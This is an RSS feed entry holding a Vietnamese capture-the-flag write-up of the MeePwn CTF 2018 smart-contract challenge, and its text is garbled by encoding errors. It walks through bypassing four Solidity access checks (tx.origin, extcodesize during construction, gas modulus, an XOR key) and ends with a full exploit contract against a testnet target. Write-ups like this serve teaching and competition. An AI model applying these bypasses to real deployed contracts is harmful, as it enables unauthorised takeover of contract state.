<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	
xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
>

<channel>
	<title>smartcontract &#8211; BabyPhD CTF Team</title>
	<atom:link href="https://babyphd.net/category/smartcontract/feed/" rel="self" type="application/rss+xml" />
	<link>https://babyphd.net</link>
	<description>NÃ³i chung Ä‘Ã¢y lÃ  má»™t khÃ¡i niá»‡m vÃ´ cÃ¹ng trá»«u tÆ°á»£ng</description>
	<lastBuildDate>Thu, 16 Aug 2018 21:09:22 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.2</generator>
<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
		<title>MEEPWN CTF 2018 - meepwn contract</title>
		<link>https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/</link>
				<pubDate>Wed, 01 Aug 2018 12:47:31 +0000</pubDate>
		<dc:creator><![CDATA[vigov5]]></dc:creator>
				<category><![CDATA[misc]]></category>
		<category><![CDATA[smartcontract]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=771</guid>
				<description><![CDATA[https://scoreboard.meepwn.team/task Source code cá»§a "gate": pragma solidity ^0.4.18; contract Meepwn_Wire { address public entrant; constructor() { entrant = msg.sender; } function isAccountAddress(address addr) private returns(bool) { uint x; assembly { x := extcodesize(caller) } return x == 0; } function exploitMe(bytes8 _key) { require(msg.sender != tx.origin); require(isAccountAddress(msg.sender)); require(msg.gas % 1337 == 0); require(uint64(_key) ^ uint64(sha3(msg.sender)) &#8230; <a href="https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - meepwn contract</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><a href="https://scoreboard.meepwn.team/task" target="_blank" rel="noopener">https://scoreboard.meepwn.team/task</a></p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/fd265c3f-adf9-428b-8bee-30682193eff2.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/fd265c3f-adf9-428b-8bee-30682193eff2.png" data-recalc-dims="1" /></p>
<p>Source code cá»§a "gate":</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract Meepwn_Wire
<span class="token punctuation">{</span>
    address <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        entrant <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">isAccountAddress</span><span class="token punctuation">(</span>address addr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token function">returns</span><span class="token punctuation">(</span>bool<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        uint x<span class="token punctuation">;</span>
        assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token keyword">return</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">exploitMe</span><span class="token punctuation">(</span>bytes8 _key<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">isAccountAddress</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>gas <span class="token operator">%</span> <span class="token number">1337</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>_key<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><span id="more-771"></span></p>
<p>Interface cá»§a contract chÃ­nh:</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract MeePwnMain <span class="token punctuation">{</span>

  <span class="token keyword">function</span> <span class="token function">getNewInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token function">returns</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">function</span> <span class="token function">submitInstance</span><span class="token punctuation">(</span>string email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span><span class="token punctuation">(</span>bytes32<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>sau khi truy cáº­p Ä‘áº¿nÂ <a href="http://178.128.87.12/smart-contract" target="_blank" rel="noopener">http://178.128.87.12/smart-contract</a>Â nhá»¯ng viá»‡c báº¡n cáº§n lÃ m nhÆ° sau (hiá»‡n site Ä‘Ã£ khÃ´ng truy cáº­p Ä‘Æ°á»£c ná»¯a, mÃ¬nh xin phÃ©p tÃ³m táº¯t láº¡i theo...kÃ­ á»©c cá»§a mÃ¬nhÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="ğŸ˜„" class="wp-smiley" style="height: 1em; max-height: 1em;" />)</p>
<ul>
<li>Sáº½ cÃ³ má»™t contract chÃ­nh táº¡i Ä‘á»‹a chá»‰Â <a href="https://ropsten.etherscan.io/address/0x3da169ad88c8f419b57e181fe971b33993dfdc81" target="_blank" rel="noopener">0x3da169ad88c8f419b57e181fe971b33993dfdc81</a>Â Ä‘Æ°á»£c deploy trÃªn Testnet Ropsten</li>
<li>Báº¡n sáº½ gá»i hÃ mÂ <code>getNewInstance</code>Â chuyá»ƒn 0.1 ETH vÃ o Ä‘á»‹a chá»‰ nÃ y, contract chÃ­nh sáº½ deploy contractÂ <strong>Meepwn_Wire</strong>Â á»Ÿ trÃªn vÃ  gÃ¡nÂ <code>entrant = msg.sender</code>Â tá»©c lÃ  Ä‘á»‹a chá»‰ cá»§a contract chÃ­nh.</li>
<li>Nhiá»‡m vá»¥ cá»§a báº¡n lÃ m tháº¿ nÃ o Ä‘Ã³, dÃ¹ng hÃ mÂ <code>exploitMe</code>, vÆ°á»£t qua táº¥t cáº£ cÃ¡c "gate", set láº¡i biáº¿nÂ <code>entrant</code>Â thÃ nh Ä‘á»‹a chá»‰ cá»§a mÃ¬nh (pwned !)</li>
<li>Sau Ä‘Ã³ gá»i hÃ mÂ <code>submitInstance</code>Â kÃ¨m vá»›i email cá»§a mÃ¬nh Ä‘á»ƒ chá»©ng minh mÃ¬nh Ä‘Ã£ lÃ m Ä‘Æ°á»£c, Ä‘á»ƒ há»‡ thá»‘ng gá»­i flag vá» email mÃ  báº¡n submit.</li>
</ul>
<p>Vá» cÆ¡ báº£n, mÃ´ hÃ¬nh nÃ y khÃ¡ giá»‘ng vá»›iÂ <a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">Ethernaut</a>Â cá»¥ thá»ƒ hÆ¡n thÃ¬ báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm cÃ¡c bÃ i write-up cá»§a anhÂ <a href="https://viblo.asia/u/kiendinang" target="_blank" rel="noopener">@kiendinang</a>Â trÃªn Viblo, vá»›i nhiá»u cáº¥p Ä‘á»™ tá»« dá»… Ä‘áº¿n khÃ³.</p>
<h1 id="_walk-through-1">Walk Through</h1>
<p>MÃ¬nh xin tÃ³m táº¯t cÃ¡c bÆ°á»›c Ä‘á»ƒ vÆ°á»£t qua cÃ¡c gate nhÆ° sau:</p>
<h2 id="_gate-1-2">Gate 1</h2>
<p><code>require(msg.sender != tx.origin);</code>Â : Trong Solidity thÃ¬Â <code>msg.sender</code>Â lÃ  thá»©/ngÆ°á»i trá»±c tiáº¿p gá»i hÃ m cá»§a contract, cÃ²nÂ <code>tx.origin</code>Â lÃ  ngÆ°á»i táº¡o ra transaction. Do váº­yÂ <code>tx.origin</code>Â sáº½ luÃ´n lÃ  ngÆ°á»i dÃ¹ng, cÃ²nÂ <code>msg.sender</code>Â thÃ¬ cÃ³ thá»ƒ lÃ  ngÆ°á»i dÃ¹ng hoáº·c lÃ  má»™t contract khÃ¡c. Do váº­y ta cÃ³ mÃ´ hÃ¬nh sau:</p>
<pre class="language-none"><code class="language-none">A (ngÆ°á»i dÃ¹ng) -&gt; B (exploit contract) -&gt; C (Meepwn_Wire contract)
</code></pre>
<p>Vá»›i mÃ´ hÃ¬nh nÃ y sáº½ Ä‘áº£m báº£o Ä‘Æ°á»£cÂ <code>msg.sender != tx.origin</code></p>
<h2 id="_gate-2-3">Gate 2</h2>
<p><code>require(isAccountAddress(msg.sender));</code>Â : Gate nÃ y Ä‘Ãºng nhÆ° tÃªn hÃ m, kiá»ƒm tra xem Ä‘á»‹a chá»‰ Ä‘ang tÆ°Æ¡ng tÃ¡c vá»›i contract, cÃ³ pháº£i lÃ  ngÆ°á»i dÃ¹ng khÃ´ng hay lÃ  má»™t contract khÃ¡c ? vÃ Â <strong>Meepwn_Wire</strong>Â yÃªu cáº§uÂ <code>msg.sender</code>Â pháº£i lÃ  má»™t account ngÆ°á»i dÃ¹ng thÃ´ng qua viá»‡c kiá»ƒm tra storage cá»§a account cÃ³ chá»©a code hay khÃ´ng báº±ng Ä‘oáº¡n assembly (náº¿u Ä‘á»‹a chá»‰ lÃ  ngÆ°á»i dÃ¹ng thÃ¬ sáº½ codesize == 0, vÃ  ngÆ°á»£c láº¡i náº¿u Ä‘Ã³ lÃ  má»™t contract khÃ¡c)</p>
<pre class="language-js"><code class="language-js">assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
</code></pre>
<p>Náº¿u váº­y, trick chÃºng ta dÃ¹ng á»Ÿ bÆ°á»›c 1 sáº½ fail ? Tuy nhiÃªn, cÃ³ má»™t thá»i Ä‘iá»ƒm mÃ  codesize cá»§a má»™t contract báº±ng 0, Ä‘Ã³ chÃ­nh lÃ  thá»i Ä‘iá»ƒm mÃ  contract Ä‘Æ°á»£c deploy (nÃ³i cÃ¡ch khÃ¡c, khi Ä‘ang cháº¡y contructor cá»§a contract), nhÆ° Ä‘Æ°á»£c note trongÂ <a href="https://github.com/ethereum/yellowpaper" target="_blank" rel="noopener">yellow paper</a>Â cá»§a Ethereum. Váº­y Ä‘á»ƒ pass qua gate nÃ y, ta cáº§n thá»±c hiá»‡n exploit trong contructor cá»§a contract. Äáº¿n Ä‘Ã¢y ta cÃ³ thá»ƒ xÃ¢y dá»±ng Ä‘Æ°á»£c contract táº¡m thá»i dÃ¹ng Ä‘á»ƒ exploit nhÆ° sau:</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">exploitMe</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>vá»›i target lÃ  Ä‘á»‹a chá»‰ cá»§a contractÂ <code>Meepwn_Wire</code>Â mÃ  contract chÃ­nh Ä‘Ã£ deploy. Äá»ƒ biáº¿t Ä‘Æ°á»£c Ä‘á»‹a chá»‰ nÃ y, báº¡n cÃ³ thá»ƒ tÃ¬m Ä‘áº¿n transactionÂ <code>getNewInstance</code>Â trÃªnÂ <a href="https://ropsten.etherscan.io/" target="_blank" rel="noopener">https://ropsten.etherscan.io/</a>Â vÃ  kiá»ƒm tra tabÂ <code>Internal Transactions</code>.</p>
<h2 id="_gate-3-4">Gate 3</h2>
<p><code>require(msg.gas % 1337 == 0);</code>Â : Gate nÃ y yÃªu cáº§u sá»‘ gas cÃ²n láº¡i (<code>msg.gas</code>) táº¡i thá»i Ä‘iá»ƒm thá»±c hiá»‡n kiá»ƒm tra pháº£i chia háº¿t cho 1337. Äá»ƒ thá»±c hiá»‡n Ä‘iá»u nÃ y, ta cÃ³ thá»ƒ gá»i hÃ mÂ <code>exploitMe</code>Â theo cÃ¡ch sau:</p>
<pre class="language-js"><code class="language-js">t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span>
</code></pre>
<p>vá»›iÂ <code>xxx</code>Â lÃ  sá»‘ gas dÃ¹ng Ä‘á»ƒ cháº¡y hÃ mÂ <code>exploitMe</code>. NhÆ° váº­y chÃºng ta sáº½ control Ä‘Æ°á»£c sá»‘ gas truyá»n vÃ o. Váº­y truyá»n vÃ o bao nhiÃªu gas Ä‘á»ƒ thoáº£ mÃ£n ? MÃ¬nh sáº½ lÃ m theo cÃ¡ch thá»­ saim truyá»n vÃ o 1 sá»‘ gas tuá»³ Ã½, vÃ  kiá»ƒm tra instruction trÃªn Remix.</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">98000</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>VÃ­ dá»¥ cháº¡y vá»›i gas 98000, cháº¯c cháº¯n transaction sáº½ fail, báº±ng sá»­ dá»¥ng mÃ´i trÆ°á»ng Javascript VM trÃªn Remix sáº½ cho phÃ©p chÃºng ta debug:<img class="medium-zoom-image" src="https://i2.wp.com/images.viblo.asia/a22a0df6-77f0-4920-b715-634fa749ffda.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/a22a0df6-77f0-4920-b715-634fa749ffda.png" data-recalc-dims="1" /></p>
<p>ClickÂ <code>Debug</code>, má»Ÿ pháº§nÂ <code>Instructions</code>Â vÃ Â <code>Stack</code>Â vÃ  step qua tá»«ng instruction cho Ä‘áº¿n Ä‘oáº¡n kiá»ƒm tra sá»‘ gas:</p>
<p><img class="medium-zoom-image" src="https://i1.wp.com/images.viblo.asia/bd209629-0feb-4b81-934e-bb8d9d5f8705.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/bd209629-0feb-4b81-934e-bb8d9d5f8705.png" data-recalc-dims="1" /></p>
<p>IP hiá»‡n Ä‘ang á»Ÿ 363, ngay sau khi chÃºng ta cháº¡y xongÂ <code>GAS</code>, top stack lÃºc nÃ y sáº½ chÃ­nh lÃ  sá»‘ gas cÃ²n láº¡i:Â <code>0x17abc = 96956</code>Â (táº¡i ngÄƒn tiáº¿p theo chÃ­nh lÃ  giÃ¡ trá»‹Â <code>0x539</code>Â = 1337). Váº­y ta sáº½ cÃ³ gas thoáº£ mÃ£n lÃ :</p>
<pre class="language-none"><code class="language-none">98000 - 96956 % 1337 = 97308
</code></pre>
<p><strong>Note</strong>: Äá»ƒ Ä‘áº£m báº£o debug Ä‘Ãºng thÃ¬ version compiler vÃ  thiáº¿t láº­p optimize cá»§a báº¡n vÃ  Ä‘á» bÃ i pháº£i giá»‘ng nhau, ráº¥t may, Ä‘á»u Ä‘ang lÃ  versionÂ <code>soljson-v0.4.24+commit.e67f0147.js</code>Â <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="ğŸ˜„" class="wp-smiley" style="height: 1em; max-height: 1em;" />, cÆ¡ mÃ  náº¿u cÃ³ sai thÃ¬ cÅ©ng sai khÃ¡c nhau khÃ´ng quÃ¡ 100 gas, chÃºng ta cÃ³ thá»ƒ brute-force Ä‘Æ°á»£cÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f606.png" alt="ğŸ˜†" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<h2 id="_gate-4-5">Gate 4</h2>
<p><code>require(uint64(_key) ^ uint64(sha3(msg.sender)) ^ uint64(sha3(address(this))) == 0x13371337);</code>Â : gate nÃ y lÃ  khÃ¡ Ä‘Æ¡n giáº£n (tuy nhiÃªn trong thá»i gian thi BTC Ä‘Ã£ khÃ´ng may Ä‘eploy nháº§m source code Ä‘oáº¡n nÃ y khiáº¿n cÃ¡c Ä‘á»™i thi tá»‘n cá»¡ "1 tiáº¿ng" tÃ¬m cÃ¡ch brute-force 8 bytes sha3 (náº¿u thá»±c sá»± cÃ³ team Ä‘á»‹nh lÃ m váº­yÂ <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f605.png" alt="ğŸ˜…" class="wp-smiley" style="height: 1em; max-height: 1em;" />)), Ä‘Ã¢y lÃ  phÃ©p XOR vÃ  chÃºng ta lÃ m láº¡i nhÆ° sau:</p>
<pre class="language-js"><code class="language-js">_key <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span>

</code></pre>
<p><code>this</code>Â á»Ÿ Ä‘Ã¢y sáº½ cho ra Ä‘á»‹a chá»‰ contract exploit cá»§a chÃºng ta.</p>
<h2 id="_full-exploit-6">Full Exploit</h2>
<p>(Test thá»­ trÃªn Remix trÆ°á»›c cho cháº¯c Äƒn rá»“i hÃ£y submit nhÃ©)</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">97308</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Viá»‡c cÃ²n láº¡i lÃ  thá»±c hiá»‡nÂ <code>submitInstance</code>Â vÃ  chá» mail flag vá»:</p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png" data-recalc-dims="1" /></p>
<h1 id="_references-7">References</h1>
<ul>
<li><a href="https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db" target="_blank" rel="noopener">https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db</a></li>
<li><a href="http://solidity.readthedocs.io/en/v0.4.24/" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/v0.4.24/</a></li>
</ul>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">771</post-id>	</item>
	</channel>
</rss>
